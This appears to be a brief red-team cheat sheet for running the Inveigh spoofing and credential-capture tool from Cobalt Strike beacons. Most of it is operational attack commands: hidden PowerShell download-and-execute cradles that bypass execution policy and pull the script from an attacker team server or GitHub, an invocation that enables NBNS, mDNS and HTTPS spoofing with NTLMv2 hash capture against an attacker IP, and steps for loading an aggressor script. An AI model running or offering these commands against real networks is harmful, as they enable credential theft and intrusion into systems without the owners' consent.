https://github.com/Kevin-Robertson/Inveigh

Run from hosting infrastructure
```CS
run powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<TeamServer IP>/Inveigh.ps1')"
```
Run from github hosting
```CS
run powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.psd1')""
```
Basic Syntax
```CS
powershell-import /root/Desktop/Inveigh/Inveigh.ps1;Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -NTLMv2 -IP <attackerIP>
```

## Method 2
```bash
cd /root/Desktop/
git clone https://github.com/Kevin-Robertson/Inveigh
cd Inveigh
wget https://raw.githubusercontent.com/Und3rf10w/Aggressor-scripts/master/inveigh/inveigh.cna
```
In the inveigh.cna script change all `inveigh/Scripts/Inveigh.ps1` to `/root/Desktop/Inveigh/Inveigh.ps1`
Add the inveigh.cna to CobaltStrike with the Script Manager.
On beacon, `powershell-import /root/Desktop/Inveigh/Inveigh.ps1`
Depending on your privs: `runPriviledgedInveigh` or `runUnPriviledgedInveigh`